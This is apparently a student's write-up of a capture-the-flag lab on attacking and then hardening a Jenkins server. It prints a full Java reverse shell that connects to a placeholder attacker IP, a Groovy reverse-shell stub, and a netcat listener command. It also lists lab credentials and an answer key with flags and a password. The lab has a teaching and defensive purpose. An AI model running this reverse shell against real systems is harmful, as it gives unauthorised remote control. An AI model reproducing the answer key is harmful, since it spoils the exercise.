# Advent of Cyber - Day 12 Attack Chain

## Defense in Depth

### Learning Objectives
- Understand Attackers mindset
- Understand Defense in Depth strategy
- Implement basic endpoint hardening
- Follow a simple Boot2Root methodology

## Server Information and Connection Instructions

- **Target Machine**: Vulnerable Ubuntu running Jenkins -> Check nmap reports : Jetty(10.0.15) CVE-2023-41900
- **Server Admin Credentials**: Given for blue team purposes
  - Username: admin
  - Password: SuperStrongPassword123

## Guided Walkthrough of the Attack Chain

1. **Getting a Web Shell**
   - Access Jenkins on default port: http://10.10.45.195:8080 
   - In the original walkthrough they get a Groovy script to establish a reverse shell :
   - Explore Jenkins features  and navigate to Manage Jenkins > Script Console
   ```groovy
   // Groovy Reverse Shell Script
   String host = "attacking machine IP here";
   int port = 4444;
   String cmd = "/bin/bash";
   // ... (complete script as provided)
   
   - But I went this way : 
   				- Access and put a java revshell http://10.10.45.195:8080/script/jqueryplugins/dataTables/extras/TableTools/media/swf/ZeroClipboard.swf -> check dirsearch report
   				
   				```java 
				import java.io.InputStream;
				import java.io.OutputStream;
				import java.net.Socket;

				public class shell {
				    public static void main(String[] args) {
					String host = "<IP_LOCAL>";
					int port = 4444;
					String cmd = "sh";
					try {
					    Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
					    Socket s = new Socket(host, port);
					    InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
					    OutputStream po = p.getOutputStream(), so = s.getOutputStream();
					    while (!s.isClosed()) {
						while (pi.available() > 0)
						    so.write(pi.read());
						while (pe.available() > 0)
						    so.write(pe.read());
						while (si.available() > 0)
						    po.write(si.read());
						so.flush();
						po.flush();
						Thread.sleep(50);
						try {
						    p.exitValue();
						    break;
						} catch (Exception e) {}
					    }
					    p.destroy();
					    s.close();
					} catch (Exception e) {}
				    }
				}
				
   - Start a netcat listener on your attacking machine: `nc -nlvp 4444`
   - Upon successful execution, a connection should be established on the netcat listener.

2. **Getting the tracy User and Root**
   - Discover an interesting bash script in `/opt/scripts/backup.sh`
   - Extract user credentials (tracy) and find clues for SSH access
   - Log in as tracy using SSH and discover sudo privileges

3. **Guided Hardening of the Server**
   - **Removal of tracy from the Sudo Group**
     - Remove tracy from the sudo group: `sudo deluser tracy sudo`
     - Confirm removal: `sudo -l -U tracy`

   - **Hardening SSH**
     - Edit `/etc/ssh/sshd_config` to disable password-based logins
     - Restart SSH service: `sudo systemctl restart ssh`

   - **Stronger Password Policies**
     - Emphasize the importance of strong passwords and periodic changes

   - **Promoting Zero Trust**
     - Revert Jenkins config to limit access: edit `config.xml.bak` and restart Jenkins service

## Conclusion

- Recap of defensive layers implemented
- Importance of defensive layers in a real-world scenario

## Questions and Answers

1. **What is the default port for Jenkins?**
   - 8080

2. **What is the password of the user tracy?**
   - 13_1n_33

3. **What's the root flag?**
   - ezRo0tW1thoutDiD

4. **What is the error message when you log in as tracy again and try sudo -l after its removal from the sudoers group?**
   - Sorry, user tracy may not run sudo on Jenkins.

5. **What's the SSH flag?**
   - **************************

6. **What's the Jenkins flag?**
   - FullTrust_has_n0_Place1nS3cur1ty
				
